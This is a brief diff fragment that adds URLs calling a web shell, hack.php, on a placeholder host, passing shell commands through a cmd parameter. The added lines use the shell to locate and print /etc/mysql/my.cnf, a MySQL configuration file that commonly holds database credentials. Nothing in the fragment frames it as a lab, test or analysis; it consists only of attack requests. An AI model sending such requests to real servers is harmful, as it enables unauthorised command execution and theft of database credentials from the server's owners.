@@ -9,3 +9,6 @@
 
 
 cdn.example.com/1a2fe/hack.php?cmd=command+goes+here
+cdn.example.com/1a2fe/hack.php?cmd=locate+my.cnf
+cdn.example.com/1a2fe/hack.php?cmd=cat+/etc/mysql/my.cnf
+
